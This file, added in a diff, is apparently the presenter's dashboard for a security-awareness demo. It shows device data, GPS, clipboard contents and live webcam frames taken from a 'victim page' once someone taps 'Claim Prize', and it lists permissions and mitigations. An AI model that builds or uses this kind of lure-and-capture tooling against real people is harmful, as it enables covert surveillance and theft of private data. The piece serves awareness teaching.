@@ -1,0 +1,799 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Live Intelligence Feed</title>
+<script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap');
+
+  :root {
+    --bg:       #0b0e14;
+    --sidebar:  #0e1118;
+    --surface:  #13171f;
+    --surface2: #181d27;
+    --border:   #1f2535;
+    --border2:  #252c3d;
+    --accent:   #e53935;
+    --accent2:  #ff6b35;
+    --blue:     #4a90d9;
+    --blue2:    #5ba3e8;
+    --green:    #27ae60;
+    --green2:   #2ecc71;
+    --yellow:   #f39c12;
+    --purple:   #8e44ad;
+    --text:     #d4daf0;
+    --text2:    #8892aa;
+    --text3:    #50596e;
+    --mono:     'JetBrains Mono', monospace;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html, body { height: 100%; overflow: hidden; }
+
+  body {
+    font-family: 'Inter', sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    font-size: 12px;
+    display: flex;
+    flex-direction: column;
+  }
+
+  /*TOP NAV*/
+  .topnav {
+    height: 48px;
+    background: var(--sidebar);
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    padding: 0 16px;
+    gap: 0;
+    flex-shrink: 0;
+    z-index: 100;
+  }
+
+  .nav-logo {
+    display: flex; align-items: center; gap: 10px;
+    padding-right: 20px;
+    border-right: 1px solid var(--border);
+    margin-right: 16px;
+  }
+  .logo-icon {
+    width: 26px; height: 26px;
+    background: var(--accent);
+    border-radius: 5px;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 13px;
+  }
+  .logo-text {
+    font-size: 13px; font-weight: 700;
+    color: #fff; letter-spacing: 0.3px;
+  }
+  .logo-sub { font-size: 9px; color: var(--text3); letter-spacing: 1px; text-transform: uppercase; }
+
+  .nav-tabs { display: flex; align-items: center; gap: 2px; flex: 1; }
+  .nav-tab {
+    padding: 6px 14px;
+    border-radius: 4px;
+    font-size: 11px;
+    font-weight: 500;
+    color: var(--text2);
+    cursor: pointer;
+    transition: all 0.15s;
+    white-space: nowrap;
+    letter-spacing: 0.2px;
+  }
+  .nav-tab:hover { color: var(--text); background: var(--surface); }
+  .nav-tab.active { color: var(--text); background: var(--surface2); }
+  .nav-tab .tab-dot {
+    display: inline-block; width: 5px; height: 5px;
+    border-radius: 50%; margin-right: 5px; background: var(--text3);
+  }
+  .nav-tab.active .tab-dot { background: var(--accent); box-shadow: 0 0 6px var(--accent); }
+
+  .nav-right {
+    display: flex; align-items: center; gap: 12px;
+    padding-left: 16px;
+    border-left: 1px solid var(--border);
+  }
+  .status-pill {
+    display: flex; align-items: center; gap: 6px;
+    background: #1a2a1a; border: 1px solid #27ae6033;
+    border-radius: 20px; padding: 4px 10px;
+    font-size: 10px; font-weight: 600; color: var(--green2);
+    letter-spacing: 0.5px;
+  }
+  .status-dot {
+    width: 6px; height: 6px; border-radius: 50%; background: var(--green2);
+    animation: blink 2s ease-in-out infinite;
+  }
+  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.3} }
+  .nav-clock {
+    font-family: var(--mono);
+    font-size: 11px; color: var(--text3);
+    letter-spacing: 1px;
+  }
+  .nav-btn {
+    background: var(--surface2); border: 1px solid var(--border2);
+    color: var(--text2); font-family: 'Inter', sans-serif;
+    font-size: 10px; font-weight: 500; padding: 5px 10px;
+    border-radius: 4px; cursor: pointer; letter-spacing: 0.3px;
+    transition: all 0.15s;
+  }
+  .nav-btn:hover { color: var(--accent); border-color: var(--accent); background: #1a1020; }
+
+  /*BODY LAYOUT*/
+  .workspace {
+    display: flex;
+    flex: 1;
+    overflow: hidden;
+  }
+
+  /*LEFT SIDEBAR*/
+  .sidebar {
+    width: 200px;
+    background: var(--sidebar);
+    border-right: 1px solid var(--border);
+    display: flex;
+    flex-direction: column;
+    flex-shrink: 0;
+    overflow-y: auto;
+    padding: 12px 0;
+  }
+  .sidebar-section {
+    padding: 0 10px;
+    margin-bottom: 20px;
+  }
+  .sidebar-label {
+    font-size: 9px; font-weight: 600; letter-spacing: 2px;
+    color: var(--text3); text-transform: uppercase;
+    padding: 0 8px; margin-bottom: 6px;
+  }
+  .sidebar-item {
+    display: flex; align-items: center; gap: 8px;
+    padding: 7px 8px; border-radius: 5px;
+    font-size: 11px; color: var(--text2);
+    cursor: pointer; transition: all 0.15s;
+    margin-bottom: 1px;
+  }
+  .sidebar-item:hover { background: var(--surface); color: var(--text); }
+  .sidebar-item.active { background: var(--surface2); color: var(--text); }
+  .sidebar-item .si-icon { font-size: 13px; width: 18px; text-align: center; }
+  .sidebar-item .si-badge {
+    margin-left: auto;
+    background: var(--accent); color: #fff;
+    font-size: 9px; font-weight: 700;
+    padding: 1px 5px; border-radius: 10px;
+    min-width: 16px; text-align: center;
+  }
+  .sidebar-item .si-badge.blue { background: var(--blue); }
+  .sidebar-item .si-badge.green { background: var(--green); }
+
+  .sidebar-divider {
+    border: none; border-top: 1px solid var(--border);
+    margin: 8px 10px;
+  }
+
+  /*MAIN CONTENT*/
+  .main {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    overflow: hidden;
+    background: var(--bg);
+  }
+
+  /*KPI BAR*/
+  .kpi-bar {
+    display: flex;
+    border-bottom: 1px solid var(--border);
+    flex-shrink: 0;
+    background: var(--surface);
+  }
+  .kpi {
+    flex: 1;
+    padding: 12px 16px;
+    border-right: 1px solid var(--border);
+    position: relative;
+  }
+  .kpi:last-child { border-right: none; }
+  .kpi-label {
+    font-size: 9px; font-weight: 600; letter-spacing: 1.5px;
+    color: var(--text3); text-transform: uppercase; margin-bottom: 5px;
+  }
+  .kpi-value {
+    font-family: var(--mono);
+    font-size: 22px; font-weight: 600;
+    color: var(--text); line-height: 1;
+  }
+  .kpi-value.red { color: var(--accent); }
+  .kpi-value.blue { color: var(--blue2); }
+  .kpi-value.green { color: var(--green2); }
+  .kpi-value.yellow { color: var(--yellow); }
+  .kpi-delta {
+    font-size: 9px; color: var(--text3); margin-top: 3px;
+    display: flex; align-items: center; gap: 4px;
+  }
+  .kpi-delta.up { color: var(--accent); }
+  .kpi-delta.live { color: var(--green2); }
+  .kpi-bar-accent {
+    position: absolute; bottom: 0; left: 0; right: 0; height: 2px;
+  }
+
+  /*CONTENT GRID*/
+  .content-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr 300px;
+    grid-template-rows: 1fr auto;
+    gap: 0;
+    flex: 1;
+    overflow: hidden;
+  }
+
+  /*PANEL*/
+  .panel {
+    border-right: 1px solid var(--border);
+    border-bottom: 1px solid var(--border);
+    display: flex; flex-direction: column;
+    overflow: hidden;
+  }
+  .panel:last-child { border-right: none; }
+
+  .panel-head {
+    padding: 9px 14px;
+    border-bottom: 1px solid var(--border);
+    display: flex; align-items: center; gap: 8px;
+    background: var(--surface);
+    flex-shrink: 0;
+  }
+  .panel-head-title {
+    font-size: 10px; font-weight: 600; letter-spacing: 0.8px;
+    color: var(--text2); text-transform: uppercase; flex: 1;
+  }
+  .panel-head-title .ph-dot {
+    display: inline-block; width: 6px; height: 6px;
+    border-radius: 50%; margin-right: 6px;
+    background: var(--border2); vertical-align: middle;
+  }
+  .panel-head-title .ph-dot.red { background: var(--accent); box-shadow: 0 0 8px #e5393566; }
+  .panel-head-title .ph-dot.blue { background: var(--blue); }
+  .panel-head-title .ph-dot.green { background: var(--green2); box-shadow: 0 0 8px #2ecc7155; }
+  .panel-tag {
+    font-size: 9px; font-weight: 600; padding: 2px 6px;
+    border-radius: 3px; letter-spacing: 0.5px;
+  }
+  .panel-tag.live { background: #1a2a1a; color: var(--green2); border: 1px solid #27ae6033; }
+  .panel-tag.warn { background: #2a1a1a; color: var(--accent); border: 1px solid #e5393533; }
+
+  .panel-body {
+    flex: 1; overflow-y: auto; padding: 0;
+  }
+  .panel-body::-webkit-scrollbar { width: 3px; }
+  .panel-body::-webkit-scrollbar-track { background: transparent; }
+  .panel-body::-webkit-scrollbar-thumb { background: var(--border2); border-radius: 2px; }
+
+  /*DATA TABLE*/
+  .data-tbl { width: 100%; border-collapse: collapse; }
+  .data-tbl tr { border-bottom: 1px solid var(--border); transition: background 0.1s; }
+  .data-tbl tr:hover { background: var(--surface); }
+  .data-tbl tr:last-child { border-bottom: none; }
+  .data-tbl td { padding: 7px 14px; vertical-align: top; }
+  .data-tbl .dk {
+    font-family: var(--mono);
+    font-size: 9px; color: var(--text3);
+    width: 130px; white-space: nowrap; letter-spacing: 0.5px;
+    padding-top: 9px;
+  }
+  .data-tbl .dv {
+    font-family: var(--mono);
+    font-size: 10px; color: var(--text); word-break: break-all; line-height: 1.6;
+  }
+  .dv.c-red    { color: var(--accent); }
+  .dv.c-orange { color: var(--accent2); }
+  .dv.c-blue   { color: var(--blue2); }
+  .dv.c-green  { color: var(--green2); }
+  .dv.c-muted  { color: var(--text3); }
+
+  .empty-state {
+    display: flex; flex-direction: column; align-items: center; justify-content: center;
+    height: 120px; color: var(--text3); gap: 8px; font-size: 11px;
+  }
+  .empty-icon { font-size: 24px; opacity: 0.3; }
+
+  /*DEVICE LIST*/
+  .device-entry {
+    padding: 10px 14px;
+    border-bottom: 1px solid var(--border);
+    cursor: pointer; transition: background 0.1s;
+    position: relative;
+  }
+  .device-entry::before {
+    content: ''; position: absolute; left: 0; top: 0; bottom: 0; width: 2px;
+    background: var(--accent);
+  }
+  .device-entry:hover { background: var(--surface); }
+  .de-top { display: flex; align-items: center; gap: 8px; margin-bottom: 4px; }
+  .de-ip {
+    font-family: var(--mono); font-size: 11px; font-weight: 600;
+    color: var(--accent);
+  }
+  .de-time {
+    font-family: var(--mono); font-size: 9px; color: var(--text3);
+    margin-left: auto;
+  }
+  .de-badge {
+    font-size: 8px; font-weight: 700; padding: 1px 5px;
+    border-radius: 2px; letter-spacing: 0.5px;
+    background: #2a1a1a; color: var(--accent); border: 1px solid #e5393533;
+  }
+  .de-meta {
+    font-size: 10px; color: var(--text3); line-height: 1.8;
+    font-family: var(--mono);
+  }
+  .de-meta span { color: var(--text2); }
+
+  /*WEBCAM PANEL*/
+  .cam-panel { background: #000; }
+  .cam-feed {
+    width: 100%; display: block;
+    background: #000;
+  }
+  .cam-placeholder {
+    display: flex; flex-direction: column;
+    align-items: center; justify-content: center;
+    height: 180px; gap: 8px;
+    color: var(--text3); font-size: 10px;
+  }
+  .cam-placeholder-icon { font-size: 28px; opacity: 0.2; }
+  .cam-info {
+    padding: 8px 12px;
+    background: var(--surface);
+    border-top: 1px solid var(--border);
+    font-family: var(--mono); font-size: 9px; color: var(--text3);
+    display: flex; align-items: center; gap: 6px;
+  }
+  .cam-live-dot {
+    width: 6px; height: 6px; border-radius: 50%; background: var(--accent);
+    animation: blink 0.8s infinite; flex-shrink: 0;
+  }
+
+  /*EVENT LOG*/
+  .log-entry {
+    display: flex; gap: 0;
+    border-bottom: 1px solid var(--border);
+    font-family: var(--mono); font-size: 10px;
+    transition: background 0.1s;
+  }
+  .log-entry:hover { background: var(--surface); }
+  .log-time {
+    width: 70px; flex-shrink: 0;
+    padding: 7px 8px 7px 14px;
+    color: var(--text3); white-space: nowrap;
+    border-right: 1px solid var(--border);
+  }
+  .log-sev {
+    width: 36px; flex-shrink: 0;
+    padding: 7px 6px;
+    text-align: center;
+    border-right: 1px solid var(--border);
+  }
+  .sev-crit { color: var(--accent); font-weight: 700; font-size: 9px; }
+  .sev-warn { color: var(--yellow); font-size: 9px; }
+  .sev-info { color: var(--blue2); font-size: 9px; }
+  .log-msg {
+    flex: 1; padding: 7px 12px; color: var(--text2);
+    line-height: 1.5;
+  }
+  .log-entry.crit .log-msg { color: var(--text); }
+
+  /*BOTTOM ROW*/
+  .bottom-row {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    border-top: 1px solid var(--border);
+    flex-shrink: 0;
+    max-height: 200px;
+    overflow: hidden;
+  }
+  .bottom-panel {
+    border-right: 1px solid var(--border);
+    overflow-y: auto;
+  }
+  .bottom-panel:last-child { border-right: none; }
+  .bottom-panel::-webkit-scrollbar { width: 3px; }
+  .bottom-panel::-webkit-scrollbar-thumb { background: var(--border2); }
+
+  .ref-row {
+    display: flex; align-items: center;
+    padding: 6px 14px;
+    border-bottom: 1px solid var(--border);
+    font-size: 10px;
+  }
+  .ref-key { color: var(--text3); width: 140px; flex-shrink: 0; font-family: var(--mono); }
+  .ref-val { color: var(--text2); flex: 1; }
+  .ref-val.c-red { color: var(--accent); }
+  .ref-val.c-green { color: var(--green2); }
+  .ref-val.c-yellow { color: var(--yellow); }
+
+  /*SCROLLBAR global*/
+  ::-webkit-scrollbar { width: 4px; height: 4px; }
+  ::-webkit-scrollbar-track { background: transparent; }
+  ::-webkit-scrollbar-thumb { background: var(--border2); border-radius: 2px; }
+
+  @media (max-width: 1100px) {
+    .content-grid { grid-template-columns: 1fr 300px; grid-template-rows: 1fr 1fr auto; }
+    .sidebar { width: 160px; }
+  }
+</style>
+</head>
+<body>
+
+<!--TOP NAV-->
+<nav class="topnav">
+  <div class="nav-logo">
+    <div class="logo-icon">🛡</div>
+    <div>
+      <div class="logo-text"></div>
+      <div class="logo-sub">SOC Platform</div>
+    </div>
+  </div>
+  <div class="nav-tabs">
+    <div class="nav-tab active"><span class="tab-dot"></span>Live Intelligence</div>
+    <!--<div class="nav-tab"><span class="tab-dot"></span>Incident Map</div>
+    <div class="nav-tab"><span class="tab-dot"></span>Device Registry</div>
+    <div class="nav-tab"><span class="tab-dot"></span>Threat Analysis</div>
+    <div class="nav-tab"><span class="tab-dot"></span>Reports</div>-->
+  </div>
+  <div class="nav-right">
+    <div class="status-pill"><div class="status-dot"></div>LIVE CAPTURE</div>
+    <div class="nav-clock" id="clock">--:--:--</div>
+    <button class="nav-btn" onclick="clearData()">Clear Session</button>
+  </div>
+</nav>
+
+<!--WORKSPACE-->
+<div class="workspace">
+
+  <!--SIDEBAR-->
+  <aside class="sidebar">
+    <div class="sidebar-section">
+      <div class="sidebar-label">Capture</div>
+      <div class="sidebar-item active">
+        <span class="si-icon"></span> Live Feed
+        <span class="si-badge" id="sb-devices">0</span>
+      </div>
+      <div class="sidebar-item">
+        <span class="si-icon"></span> Camera Streams
+        <span class="si-badge blue" id="sb-cam">OFF</span>
+      </div>
+      <div class="sidebar-item">
+        <span class="si-icon"></span> Data Dumps
+        <span class="si-badge green">0</span>
+      </div>
+    </div>
+    <hr class="sidebar-divider">
+    <!--<div class="sidebar-section">
+      <div class="sidebar-label">Analysis</div>
+      <div class="sidebar-item"><span class="si-icon"></span> Geo Map</div>
+      <div class="sidebar-item"><span class="si-icon"></span> Fingerprints</div>
+      <div class="sidebar-item"><span class="si-icon"></span> Session Stats</div>
+    </div>
+    <hr class="sidebar-divider">
+    <div class="sidebar-section">
+      <div class="sidebar-label">Session</div>
+      <div class="sidebar-item"><span class="si-icon"></span> Settings</div>
+      <div class="sidebar-item"><span class="si-icon"></span> Export</div>
+    </div>
+    <hr class="sidebar-divider">-->
+    <!--mini stats-->
+    <div class="sidebar-section">
+      <div class="sidebar-label">This Session</div>
+      <div style="padding: 0 8px;">
+        <div style="margin-bottom:10px;">
+          <div style="font-size:9px;color:var(--text3);margin-bottom:3px;font-family:var(--mono);">EVENTS</div>
+          <div style="font-family:var(--mono);font-size:18px;color:var(--text)" id="sb-events">0</div>
+        </div>
+        <div style="margin-bottom:10px;">
+          <div style="font-size:9px;color:var(--text3);margin-bottom:3px;font-family:var(--mono);">FIELDS CAPTURED</div>
+          <div style="font-family:var(--mono);font-size:18px;color:var(--accent)" id="sb-fields">0</div>
+        </div>
+      </div>
+    </div>
+  </aside>
+
+  <!--MAIN-->
+  <main class="main">
+
+    <!--KPI BAR-->
+    <div class="kpi-bar">
+      <div class="kpi">
+        <div class="kpi-label">Devices Profiled</div>
+        <div class="kpi-value red" id="kpi-devices">0</div>
+        <div class="kpi-delta up" id="kpi-devices-delta">— awaiting connection</div>
+        <div class="kpi-bar-accent" style="background:linear-gradient(90deg,var(--accent),transparent)"></div>
+      </div>
+      <div class="kpi">
+        <div class="kpi-label">Data Fields Harvested</div>
+        <div class="kpi-value blue" id="kpi-fields">0</div>
+        <div class="kpi-delta" id="kpi-fields-delta">— per device</div>
+        <div class="kpi-bar-accent" style="background:linear-gradient(90deg,var(--blue),transparent)"></div>
+      </div>
+      <div class="kpi">
+        <div class="kpi-label">Camera Status</div>
+        <div class="kpi-value yellow" id="kpi-cam">INACTIVE</div>
+        <div class="kpi-delta live" id="kpi-cam-delta">Waiting for device</div>
+        <div class="kpi-bar-accent" style="background:linear-gradient(90deg,var(--yellow),transparent)"></div>
+      </div>
+      <div class="kpi">
+        <div class="kpi-label">Session Events</div>
+        <div class="kpi-value green" id="kpi-events">0</div>
+        <div class="kpi-delta live">recording</div>
+        <div class="kpi-bar-accent" style="background:linear-gradient(90deg,var(--green),transparent)"></div>
+      </div>
+    </div>
+
+    <!--CONTENT GRID-->
+    <div class="content-grid">
+
+      <!--COL 1: DEVICE DATA TABLE-->
+      <div class="panel">
+        <div class="panel-head">
+          <div class="panel-head-title"><span class="ph-dot red"></span>Latest Device Intelligence</div>
+          <span class="panel-tag warn" id="data-status">WAITING</span>
+        </div>
+        <div class="panel-body" id="data-panel-body">
+          <div class="empty-state">
+            <div class="empty-icon"></div>
+            <div>Waiting for demo device to connect</div>
+            <div style="font-size:9px;color:var(--text3);font-family:var(--mono);">Open victim page on demo device</div>
+          </div>
+        </div>
+      </div>
+
+      <!--COL 2: DEVICE LIST + LOG-->
+      <div style="display:flex;flex-direction:column;border-right:1px solid var(--border);">
+
+        <!--Device List-->
+        <div style="flex:0 0 auto;border-bottom:1px solid var(--border);">
+          <div class="panel-head">
+            <div class="panel-head-title"><span class="ph-dot blue"></span>Profiled Devices</div>
+            <span class="panel-tag live">LIVE</span>
+          </div>
+          <div id="device-list" style="max-height:180px;overflow-y:auto;">
+            <div class="empty-state" style="height:80px;">
+              <div class="empty-icon" style="font-size:16px;"></div>
+              <div>No devices captured yet</div>
+            </div>
+          </div>
+        </div>
+
+        <!--Event Log-->
+        <div style="flex:1;display:flex;flex-direction:column;overflow:hidden;">
+          <div class="panel-head">
+            <div class="panel-head-title"><span class="ph-dot"></span>Event Log</div>
+          </div>
+          <div style="flex:1;overflow-y:auto;" id="log-wrap">
+            <div id="log-body"></div>
+          </div>
+        </div>
+
+      </div>
+
+      <!--COL 3: CAMERA FEED-->
+      <div style="display:flex;flex-direction:column;border-right:none;">
+        <div class="panel-head">
+          <div class="panel-head-title"><span class="ph-dot" id="cam-ph-dot"></span>Camera Feed</div>
+          <span class="panel-tag live" id="cam-tag" style="display:none;"> LIVE</span>
+        </div>
+        <div style="background:#000;flex:1;display:flex;flex-direction:column;">
+          <div class="cam-placeholder" id="cam-placeholder">
+            <div class="cam-placeholder-icon"></div>
+            <div>No stream active</div>
+            <div style="font-size:9px;font-family:var(--mono);">Tap "Claim Prize" on device</div>
+          </div>
+          <img id="dashcam" src="" style="display:none;width:100%;display:none;" />
+        </div>
+        <div class="cam-info" id="cam-info-bar">
+          <span id="cam-status-text">Awaiting stream</span>
+        </div>
+      </div>
+
+    </div>
+
+    <!--BOTTOM ROW: Reference panels-->
+    <div class="bottom-row">
+      <div class="bottom-panel">
+        <div class="panel-head" style="background:var(--surface);">
+          <div class="panel-head-title"><span class="ph-dot"></span>What Was Captured Without Permission</div>
+        </div>
+        <div class="ref-row"><div class="ref-key">IP Address</div><div class="ref-val c-red"> No permission required</div></div>
+        <div class="ref-row"><div class="ref-key">Device / OS / Browser</div><div class="ref-val c-red"> No permission required</div></div>
+        <div class="ref-row"><div class="ref-key">Screen resolution</div><div class="ref-val c-red"> No permission required</div></div>
+        <div class="ref-row"><div class="ref-key">Battery level</div><div class="ref-val c-red"> No permission required</div></div>
+        <div class="ref-row"><div class="ref-key">Network type / speed</div><div class="ref-val c-red"> No permission required</div></div>
+        <div class="ref-row"><div class="ref-key">Canvas fingerprint</div><div class="ref-val c-red"> Unique device ID, no permission</div></div>
+        <div class="ref-row"><div class="ref-key">Clipboard contents</div><div class="ref-val c-yellow"> Prompt in some browsers</div></div>
+        <div class="ref-row"><div class="ref-key">GPS location</div><div class="ref-val c-green"> Requires user permission</div></div>
+        <div class="ref-row"><div class="ref-key">Camera / microphone</div><div class="ref-val c-green"> Requires ONE click</div></div>
+      </div>
+      <div class="bottom-panel">
+        <div class="panel-head" style="background:var(--surface);">
+          <div class="panel-head-title"><span class="ph-dot"></span>Mitigation Recommendations</div>
+        </div>
+        <div class="ref-row"><div class="ref-key">VPN</div><div class="ref-val">Masks real IP and location from sites</div></div>
+        <div class="ref-row"><div class="ref-key">Camera / mic</div><div class="ref-val c-green">Block by default, only allow trusted sites</div></div>
+        <div class="ref-row"><div class="ref-key">Location access</div><div class="ref-val c-green">Disabled by default in browser settings</div></div>
+        <div class="ref-row"><div class="ref-key">Clipboard API</div><div class="ref-val">Block in browser: Settings → Privacy</div></div>
+        <div class="ref-row"><div class="ref-key">Fingerprinting</div><div class="ref-val">Firefox + uBlock Origin reduces exposure</div></div>
+        <div class="ref-row"><div class="ref-key">Incognito mode</div><div class="ref-val c-yellow"> Does NOT prevent fingerprinting</div></div>
+        <div class="ref-row"><div class="ref-key">Unknown links</div><div class="ref-val c-red">Never click type URLs directly</div></div>
+        <div class="ref-row"><div class="ref-key">Public Wi-Fi</div><div class="ref-val c-red">Treat as hostile. Always use VPN.</div></div>
+      </div>
+    </div>
+
+  </main>
+</div>
+
+<script>
+  const socket = io();
+  let deviceCount = 0, eventCount = 0;
+
+  //Clock
+  setInterval(() => {
+    document.getElementById('clock').textContent = new Date().toLocaleTimeString('en-GB');
+  }, 1000);
+
+  //Log
+  function addLog(msg, sev = 'info') {
+    const wrap = document.getElementById('log-body');
+    const row = document.createElement('div');
+    row.className = `log-entry ${sev === 'crit' ? 'crit' : ''}`;
+    const sevLabel = sev === 'crit' ? 'CRIT' : sev === 'warn' ? 'WARN' : 'INFO';
+    const sevClass = sev === 'crit' ? 'sev-crit' : sev === 'warn' ? 'sev-warn' : 'sev-info';
+    row.innerHTML = `
+      <div class="log-time">${new Date().toLocaleTimeString('en-GB')}</div>
+      <div class="log-sev ${sevClass}">${sevLabel}</div>
+      <div class="log-msg">${msg}</div>`;
+    wrap.insertBefore(row, wrap.firstChild);
+    if (wrap.children.length > 100) wrap.removeChild(wrap.lastChild);
+    eventCount++;
+    document.getElementById('kpi-events').textContent = eventCount;
+    document.getElementById('sb-events').textContent = eventCount;
+  }
+
+  //Receive device data
+  socket.on('new_data', data => {
+    deviceCount++;
+    document.getElementById('kpi-devices').textContent = deviceCount;
+    document.getElementById('sb-devices').textContent = deviceCount;
+    document.getElementById('kpi-devices-delta').textContent = `Last: ${data.timestamp || 'just now'}`;
+
+    const fields = Object.keys(data).filter(k => data[k] && data[k] !== '—').length;
+    document.getElementById('kpi-fields').textContent = fields;
+    document.getElementById('kpi-fields-delta').textContent = `${fields} fields this capture`;
+    document.getElementById('sb-fields').textContent = fields;
+
+    document.getElementById('data-status').textContent = 'CAPTURED';
+    document.getElementById('data-status').style.background = '#1a2a1a';
+    document.getElementById('data-status').style.color = 'var(--green2)';
+    document.getElementById('data-status').style.borderColor = '#27ae6033';
+
+    //Build data table
+    const rows = [
+      ['ip_address',        data.ip,                'c-red'],
+      ['real_ip',           data.real_ip,           'c-red'],
+      ['geo_location',      data.location,          'c-orange'],
+      ['isp_org',           data.isp,               'c-orange'],
+      ['device_type',       data.deviceType,        ''],
+      ['operating_system',  data.os,                ''],
+      ['browser',           data.browser,           ''],
+      ['screen_res',        data.screen,            ''],
+      ['language',          data.language,          ''],
+      ['timezone',          data.timezone,          ''],
+      ['battery',           data.battery,           'c-orange'],
+      ['network_type',      data.network,           ''],
+      ['gps_coords',        data.gps,               data.gps && !data.gps.includes('Denied') ? 'c-red' : 'c-muted'],
+      ['cookies_enabled',   data.cookies ? 'true' : 'false', ''],
+      ['canvas_fingerprint',data.canvasFingerprint, 'c-red'],
+      ['clipboard_data',    data.clipboard,         data.clipboard && !data.clipboard.includes('Blocked') ? 'c-orange' : 'c-muted'],
+      ['referrer',          data.referrer,          ''],
+      ['timestamp',         data.timestamp,         'c-muted'],
+    ];
+
+    const html = rows.filter(([,v]) => v).map(([k, v, cls]) => `
+      <tr>
+        <td class="dk">${k}</td>
+        <td class="dv ${cls || ''}">${v}</td>
+      </tr>`).join('');
+
+    document.getElementById('data-panel-body').innerHTML = `<table class="data-tbl">${html}</table>`;
+
+    //Device card
+    const list = document.getElementById('device-list');
+    const empty = list.querySelector('.empty-state');
+    if (empty) empty.remove();
+
+    const card = document.createElement('div');
+    card.className = 'device-entry';
+    card.innerHTML = `
+      <div class="de-top">
+        <span class="de-ip">${data.ip || '?.?.?.?'}</span>
+        <span class="de-badge">NEW</span>
+        <span class="de-time">${data.timestamp || ''}</span>
+      </div>
+      <div class="de-meta">
+        os=<span>${data.os || '?'}</span>  browser=<span>${data.browser || '?'}</span>  type=<span>${data.deviceType || '?'}</span><br>
+        loc=<span>${data.location || '?'}</span><br>
+        bat=<span>${data.battery || '?'}</span>  net=<span>${data.network || '?'}</span><br>
+        fp=<span style="color:var(--accent)">${data.canvasFingerprint || '?'}</span>
+      </div>`;
+    list.insertBefore(card, list.firstChild);
+
+    addLog(`Device profiled — ${data.ip} [${data.os} / ${data.browser}]`, 'crit');
+    if (data.battery) addLog(`Battery: ${data.battery} | Network: ${data.network} | Location: ${data.location}`, 'warn');
+    if (data.gps && !data.gps.includes('Denied')) addLog(`GPS obtained: ${data.gps}`, 'crit');
+    if (data.clipboard && !data.clipboard.includes('Blocked') && !data.clipboard.includes('Empty')) {
+      addLog(`Clipboard read: "${data.clipboard.substring(0, 50)}…"`, 'crit');
+    }
+    addLog(`Canvas fingerprint: ${data.canvasFingerprint}`, 'info');
+  });
+
+  //Webcam
+  socket.on('webcam_frame', msg => {
+    const cam = document.getElementById('dashcam');
+    const placeholder = document.getElementById('cam-placeholder');
+    const dot = document.getElementById('cam-ph-dot');
+    const tag = document.getElementById('cam-tag');
+
+    if (msg.type === 'frame') {
+      cam.src = msg.data;
+      cam.style.display = 'block';
+      placeholder.style.display = 'none';
+      dot.classList.add('red');
+      tag.style.display = 'inline-block';
+      document.getElementById('kpi-cam').textContent = 'STREAMING';
+      document.getElementById('kpi-cam').style.color = 'var(--accent)';
+      document.getElementById('kpi-cam-delta').textContent = '● live video feed active';
+      document.getElementById('cam-status-text').innerHTML = '<span style="color:var(--accent)">● LIVE</span> — streaming via WebSocket';
+      document.getElementById('sb-cam').textContent = 'LIVE';
+      document.getElementById('sb-cam').style.background = 'var(--accent)';
+      const liveEl = document.getElementById('cam-info-bar');
+      liveEl.querySelector('span') || null;
+    } else if (msg.type === 'stopped') {
+      cam.style.display = 'none';
+      placeholder.style.display = 'flex';
+      dot.classList.remove('red');
+      tag.style.display = 'none';
+      document.getElementById('kpi-cam').textContent = 'INACTIVE';
+      document.getElementById('kpi-cam').style.color = 'var(--yellow)';
+      document.getElementById('kpi-cam-delta').textContent = 'stream ended';
+      document.getElementById('cam-status-text').textContent = 'Stream ended';
+      document.getElementById('sb-cam').textContent = 'OFF';
+      document.getElementById('sb-cam').style.background = 'var(--blue)';
+      addLog('Camera stream stopped by device', 'warn');
+    }
+  });
+
+  function clearData() {
+    document.getElementById('data-panel-body').innerHTML = `
+      <div class="empty-state"><div class="empty-icon"></div><div>Session cleared — waiting…</div></div>`;
+    document.getElementById('device-list').innerHTML = `
+      <div class="empty-state" style="height:80px;"><div class="empty-icon" style="font-size:16px;"></div><div>Cleared</div></div>`;
+    document.getElementById('log-body').innerHTML = '';
+    deviceCount = 0; eventCount = 0;
+    ['kpi-devices','kpi-fields','kpi-events','sb-devices','sb-fields','sb-events'].forEach(id => {
+      document.getElementById(id).textContent = '0';
+    });
+    document.getElementById('kpi-cam').textContent = 'INACTIVE';
+    document.getElementById('data-status').textContent = 'WAITING';
+    document.getElementById('data-status').style.cssText = '';
+    addLog('Session cleared by presenter', 'warn');
+  }
+
+  addLog('SOC session ready capture session started', 'info');
+  addLog('Open victim page on demo device to begin profiling', 'info');
+</script>
+</body>
+</html>
